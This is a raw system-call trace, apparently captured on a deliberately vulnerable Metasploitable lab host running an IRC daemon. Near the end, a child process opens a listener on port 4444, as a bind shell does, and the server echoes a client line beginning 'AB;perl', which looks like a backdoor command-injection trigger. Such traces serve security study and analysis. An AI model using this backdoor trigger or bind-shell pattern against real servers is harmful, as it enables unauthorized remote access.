6688  07:15:03.421612 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421624 stat64("/usr/lib/tls/i686/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421636 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421648 stat64("/usr/lib/tls/i686", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421659 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421671 stat64("/usr/lib/tls/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421683 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421695 stat64("/usr/lib/tls/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421736 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421766 stat64("/usr/lib/tls/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421778 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421789 stat64("/usr/lib/tls", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421800 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421813 stat64("/usr/lib/i686/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421825 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421837 stat64("/usr/lib/i686/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421849 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421861 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6688  07:15:03.421879 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421891 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6688  07:15:03.421908 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421920 stat64("/usr/lib/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421932 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421944 stat64("/usr/lib/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421955 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421967 stat64("/usr/lib/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.421978 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.421989 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
6688  07:15:03.422006 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422020 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422032 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422045 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422061 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422075 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422087 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422100 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422112 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422125 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422138 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422150 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422162 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422176 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422188 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422226 stat64("/lib/i486-linux-gnu/tls", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422238 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422269 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422281 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422294 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422306 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422319 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422331 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422344 stat64("/lib/i486-linux-gnu/i686", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422355 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422369 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422381 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422393 stat64("/lib/i486-linux-gnu/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422405 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422418 stat64("/lib/i486-linux-gnu/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422429 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422442 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6688  07:15:03.422459 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422473 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422486 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422500 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422513 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422526 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422542 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422555 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422567 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422581 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422594 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422606 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422619 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422632 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422644 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422657 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422669 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422682 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422720 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422735 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422764 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422778 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422790 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422803 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422815 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422828 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422840 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422853 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422865 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422878 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfdada3c) = -1 ENOENT (No such file or directory)
6688  07:15:03.422890 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6688  07:15:03.422903 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6688  07:15:03.422922 munmap(0xb7d92000, 29913) = 0
6688  07:15:03.422943 open("/etc/ld.so.cache", O_RDONLY) = 6
6688  07:15:03.422955 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6688  07:15:03.422971 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d92000
6688  07:15:03.422982 close(6)          = 0
6688  07:15:03.422993 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6688  07:15:03.423008 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
6688  07:15:03.423023 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6688  07:15:03.423117 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
6688  07:15:03.423139 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d87000
6688  07:15:03.423151 mmap2(0xb7d90000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d90000
6688  07:15:03.423168 close(6)          = 0
6688  07:15:03.423221 munmap(0xb7d92000, 29913) = 0
6688  07:15:03.423244 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
6688  07:15:03.423275 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
6688  07:15:03.423291 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
6688  07:15:03.423308 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d99000
6688  07:15:03.423319 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
6688  07:15:03.423511 close(6)          = 0
6688  07:15:03.423522 munmap(0xb7d99000, 4096) = 0
6688  07:15:03.423540 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
6688  07:15:03.423553 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
6688  07:15:03.423570 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d99000
6688  07:15:03.423581 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
6688  07:15:03.423814 close(6)          = 0
6688  07:15:03.423825 munmap(0xb7d99000, 4096) = 0
6688  07:15:03.423853 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
6688  07:15:03.423874 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdadf48) = -1 EINVAL (Invalid argument)
6688  07:15:03.423887 _llseek(6, 0, 0xbfdadf90, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6688  07:15:03.423899 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdadf48) = -1 EINVAL (Invalid argument)
6688  07:15:03.423910 _llseek(6, 0, 0xbfdadf90, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6688  07:15:03.423920 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
6688  07:15:03.423973 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
6688  07:15:03.424012 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
6688  07:15:03.424036 listen(6, 5)      = 0
6688  07:15:03.424090 accept(6,  <unfinished ...>
6687  07:15:03.430212 exit_group(0)     = ?
6685  07:15:03.430381 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 6687
6685  07:15:03.430409 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6685  07:15:03.430434 --- SIGCHLD (Child exited) @ 0 (0) ---
6685  07:15:03.430448 waitpid(-1, 0xbff6b2e8, WNOHANG) = -1 ECHILD (No child processes)
6685  07:15:03.430465 sigreturn()       = ? (mask now [])
6685  07:15:03.430515 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
6685  07:15:03.430574 exit_group(0)     = ?
4519  07:15:03.430612 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 6685
4519  07:15:03.430624 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:15:03.430639 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:15:03.430650 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:15:03.430660 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:15:03.430687 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:15:03.430815 gettimeofday({1495624503, 430820}, NULL) = 0
4519  07:15:03.430830 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 930000})
4519  07:15:03.499350 clock_gettime(CLOCK_MONOTONIC, {1313, 316370711}) = 0
4519  07:15:03.499375 recv(9, "PRIVMSG  #testit3 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:15:03.499404 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499431 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499445 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499460 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499473 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499488 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499501 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499515 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499528 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499542 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499556 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499569 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499583 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499596 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499611 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499625 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499638 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499651 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499665 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499680 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499694 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499708 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.499725 time(NULL)        = 1495624503
4519  07:15:03.499767 time(NULL)        = 1495624503
4519  07:15:03.499782 gettimeofday({1495624503, 499786}, NULL) = 0
4519  07:15:03.499794 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:03.499837 clock_gettime(CLOCK_MONOTONIC, {1313, 316850217}) = 0
4519  07:15:03.499848 gettimeofday({1495624503, 499851}, NULL) = 0
4519  07:15:03.499858 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 850000})
4519  07:15:03.650152 clock_gettime(CLOCK_MONOTONIC, {1313, 467171874}) = 0
4519  07:15:03.650173 recv(4, "PRIVMSG  #testit Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 54
4519  07:15:03.650200 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650218 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650232 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650247 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:03.650260 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
